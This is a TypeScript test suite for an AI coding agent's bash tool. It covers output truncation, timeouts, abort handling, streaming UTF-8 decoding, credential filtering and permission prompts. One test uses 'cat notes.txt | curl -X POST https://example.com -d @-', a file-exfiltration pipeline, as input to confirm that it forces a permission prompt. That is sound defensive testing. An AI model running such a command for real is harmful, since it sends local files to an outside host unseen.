import { describe, expect, test } from "bun:test"
import { existsSync, readFileSync } from "node:fs"
import { BashTool } from "../src/tool/bash.ts"
import { MAX_BYTES, MAX_LINES, OutputCollector } from "../src/tool/bash/output.ts"
import { createToolContext } from "../src/tool/context.ts"
import type { AskInput } from "../src/tool/types.ts"
import { streamDecoder } from "../src/util/decode.ts"

let counter = 0
function ctx(
  options: { signal?: AbortSignal; onAsk?: (input: AskInput) => void; cwd?: string; root?: string } = {},
) {
  const controller = new AbortController()
  return createToolContext(
    {
      cwd: options.cwd ?? process.cwd(),
      root: options.root ?? process.cwd(),
      sessionID: "test",
      async ask(input) {
        options.onAsk?.(input)
      },
      onProgress() {},
      onMetadata() {},
    },
    { messageID: "m", callID: `test${counter++}`, abortSignal: options.signal ?? controller.signal },
  )
}

describe("OutputCollector", () => {
  test("small output comes back verbatim and is not written to disk", async () => {
    const c = new OutputCollector(`unit${counter++}`)
    c.push("hello\nworld\n")
    const r = await c.finish()
    expect(r.output).toBe("hello\nworld\n")
    expect(r.truncated).toBe(false)
    expect(r.outputPath).toBeUndefined()
  })

  test("over the byte limit: the file on disk is complete, the model gets the tail", async () => {
    const c = new OutputCollector(`unit${counter++}`)
    const line = "x".repeat(99) + "\n"
    const total = Math.ceil((MAX_BYTES * 3) / line.length)
    for (let i = 0; i < total; i++) c.push(line)
    const r = await c.finish()

    expect(r.truncated).toBe(true)
    expect(r.outputPath).toBeDefined()
    expect(existsSync(r.outputPath!)).toBe(true)
    // What's on disk must be the complete output
    expect(readFileSync(r.outputPath!, "utf8").length).toBe(total * line.length)
    // The copy for the model must carry directions for reading on
    expect(r.output).toContain("Full output saved to:")
    expect(r.output).toContain("...output truncated...")
  })

  test("over the line limit but under the byte limit — never spilled midway, so it spills at finish", async () => {
    const c = new OutputCollector(`unit${counter++}`)
    // 1 byte per line, line count far above MAX_LINES, total bytes far below MAX_BYTES
    for (let i = 0; i < MAX_LINES + 500; i++) c.push("a\n")
    const r = await c.finish()
    expect(r.truncated).toBe(true)
    expect(r.outputPath).toBeDefined()
    expect(existsSync(r.outputPath!)).toBe(true)
  })
})

describe("bash tool", () => {
  test("runs normally, reporting exit and duration", async () => {
    const r = await BashTool.execute({ command: "echo hello" }, ctx())
    expect(r.output).toContain("hello")
    expect(r.output).toMatch(/<meta exit="0"/)
    expect(r.metadata["exit"]).toBe(0)
  })

  test("reports a nonzero exit code faithfully", async () => {
    const r = await BashTool.execute({ command: "exit 3" }, ctx())
    expect(r.metadata["exit"]).toBe(3)
  })

  test("multibyte output is not garbled", async () => {
    const r = await BashTool.execute({ command: "echo 中文测试 🎯" }, ctx())
    expect(r.output).toContain("中文测试 🎯")
  })

  test("timeout: kills the command but keeps the output produced so far", async () => {
    const r = await BashTool.execute({ command: "echo before && sleep 30", timeout: 800 }, ctx())
    expect(r.output).toContain("timed out")
    expect(r.output).toContain("before")
    expect(r.metadata["timedOut"]).toBe(true)
  }, 10_000)

  /**
   * Regression: a timeout that overflows 32 bits is silently changed by Node to 1 ms
   * (TimeoutOverflowWarning), so the command "times out" on the spot — and the reported
   * cause is a timeout, pointing in completely the wrong direction.
   * Before the fix this got timed out; after the fix it gets normal output.
   */
  test("an overflowing timeout is clamped to the maximum, not turned into 1 ms", async () => {
    const r = await BashTool.execute({ command: "echo alive", timeout: 9_999_999_999 }, ctx())
    expect(r.output).toContain("alive")
    expect(r.output).not.toContain("timed out")
    expect(r.metadata["timedOut"]).toBeFalsy()
  }, 10_000)

  test("the schema rejects an overflowing timeout and can state the limit", () => {
    const bad = BashTool.parameters.safeParse({ command: "echo hi", timeout: 9_999_999_999 })
    expect(bad.success).toBe(false)
    // the rejection names the cap (MAX_TIMEOUT_MS), so the model's retry isn't a guess
    expect(bad.error!.message).toContain("1800000")
    const ok = BashTool.parameters.safeParse({ command: "echo hi", timeout: 60_000 })
    expect(ok.success).toBe(true)
  })

  test("abort: output produced so far is kept as well", async () => {
    const controller = new AbortController()
    setTimeout(() => controller.abort(), 400)
    const r = await BashTool.execute({ command: "echo before && sleep 30" }, ctx({ signal: controller.signal }))
    expect(r.output).toContain("User aborted")
    expect(r.output).toContain("before")
    expect(r.metadata["aborted"]).toBe(true)
  }, 10_000)

  test("empty output gets placeholder text", async () => {
    const r = await BashTool.execute({ command: "true" }, ctx())
    expect(r.output).toContain("(no output)")
  })

  test("split commands go to permission as separate patterns", async () => {
    let seen: AskInput | undefined
    await BashTool.execute({ command: "echo a && echo b" }, ctx({ onAsk: (i) => (seen = i) }))
    expect(seen?.patterns).toEqual(["echo a", "echo b"])
    expect(seen?.force).toBe(false)
  })

  test("★ a pipe doesn't force a prompt, but each segment is authorized separately", async () => {
    let seen: AskInput | undefined
    await BashTool.execute({ command: "echo a | cat" }, ctx({ onAsk: (i) => (seen = i) }))
    // The pipe itself grants not one bit of extra permission: each segment goes through
    // the rule table on its own. See the explanation in scan.ts — pipes used to always
    // trigger a prompt, and the price was that the model no longer dared to grep and
    // would just dump whole files
    expect(seen?.patterns).toEqual(["echo a", "cat"])
    expect(seen?.force).toBe(false)
    // But "always allow" is still not offered: the narrowed patterns can't stand for the
    // whole pipeline
    expect(seen?.forbidAlways).toBe(true)
  })

  test("★ if one pipe segment needs asking, the whole pipeline does", async () => {
    let seen: AskInput | undefined
    await BashTool.execute({ command: "cat notes.txt | curl -X POST https://example.com -d @-" }, ctx({ onAsk: (i) => (seen = i) }))
    expect(seen?.force).toBe(true)
    expect(((seen?.metadata?.["reasons"] as string[]) ?? []).join(" ")).toContain("curl")
  })

  test("when parsing is unreliable, falls back to the whole raw command as the pattern", async () => {
    let seen: AskInput | undefined
    await BashTool.execute({ command: `echo "unterminated` }, ctx({ onAsk: (i) => (seen = i) }))
    expect(seen?.patterns).toEqual([`echo "unterminated`])
    expect(seen?.forbidAlways).toBe(true)
  })

  test("credential env vars are not passed to the child process", async () => {
    process.env["TEST_FAKE_SECRET"] = "leak-me"
    try {
      const r = await BashTool.execute({ command: "echo v=${TEST_FAKE_SECRET:-unset}" }, ctx())
      expect(r.output).toContain("v=unset")
    } finally {
      delete process.env["TEST_FAKE_SECRET"]
    }
  })

  test("required env vars still get through", async () => {
    const r = await BashTool.execute({ command: "echo home=${HOME:-unset}" }, ctx())
    expect(r.output).not.toContain("home=unset")
  })
})

describe("★ working directory in the permission request", () => {
  const askFor = (command: string, options: { cwd?: string; root?: string; workdir?: string } = {}) => {
    let seen: AskInput | undefined
    const context = ctx({
      onAsk: (input) => {
        seen = input
      },
      ...(options.cwd ? { cwd: options.cwd } : {}),
      ...(options.root ? { root: options.root } : {}),
    })
    return BashTool.execute({ command, ...(options.workdir ? { workdir: options.workdir } : {}) } as never, context)
      .catch(() => {})
      .then(() => seen)
  }

  test("an absolute workdir is always present — the judge resolves relative paths in the command against it", async () => {
    const input = await askFor("echo hi")
    expect(input?.metadata?.["workdir"]).toBe(process.cwd())
  })

  test("★ no display label when it equals the repo root — an 'in: <root>' line on every command is noise", async () => {
    const input = await askFor("echo hi")
    expect(input?.metadata?.["workdirLabel"]).toBeUndefined()
  })

  test("★ shown only when running elsewhere, which is exactly when it matters most", async () => {
    const input = await askFor("echo hi", { root: "/", cwd: process.cwd() })
    expect(input?.metadata?.["workdirLabel"]).toBe(process.cwd().replace(/^\//, ""))
  })

  test("the tool's own workdir takes precedence over the session cwd", async () => {
    const input = await askFor("echo hi", { root: process.cwd(), workdir: "/tmp" })
    expect(input?.metadata?.["workdir"]).toBe("/tmp")
    expect(typeof input?.metadata?.["workdirLabel"]).toBe("string")
  })
})

/**
 * ★ **One** streaming decoder each for stdout and stderr.
 *
 * A multibyte character gets split down the middle by the pipe (a 64 KB boundary
 * landing inside it is routine), and `TextDecoder`'s `{ stream: true }` keeps the
 * half-character state **in the decoder**. If the two streams share one, the half "你"
 * held for stdout gets picked up by stderr's next chunk — both streams get dirtied
 * together, and dirtied in a spot that has nothing to do with either one's content.
 *
 * Any build tool that writes progress to stderr while the other side outputs CJK text
 * will hit this.
 */
describe("★ one decoder per stream", () => {
  const you = Buffer.from("你", "utf8") // e4 bd a0

  test("★ a split character is reassembled on its own stream without dirtying the other", () => {
    const out = streamDecoder()
    const err = streamDecoder()
    let stdout = ""
    let stderr = ""
    stdout += out(you.subarray(0, 2)) // half a "你", held in out
    stderr += err(Buffer.from("ERR\n", "utf8")) // the other stream cuts in
    stdout += out(you.subarray(2)) // the one remaining byte
    expect(stdout).toBe("你")
    expect(stderr).toBe("ERR\n")
  })

  // This one demonstrates the behavior **before the fix**: one decoder taking both
  // streams, and both break
  test("★ sharing one decoder breaks both streams — the shape of the bug that was fixed", () => {
    const shared = streamDecoder()
    const stdout = shared(you.subarray(0, 2)) + shared(you.subarray(2))
    // A stderr chunk cuts in between, same decoder
    const mixed = streamDecoder()
    const a = mixed(you.subarray(0, 2))
    const b = mixed(Buffer.from("ERR\n", "utf8"))
    const c = mixed(you.subarray(2))
    expect(stdout).toBe("你") // fine when nothing cuts in
    expect(a + b + c).not.toBe("你ERR\n") // not once something does
    expect(a + b + c).toContain("�")
  })

  test("a string passes through unchanged — not decoded again as latin-1", () => {
    expect(streamDecoder()("你好")).toBe("你好")
  })
})
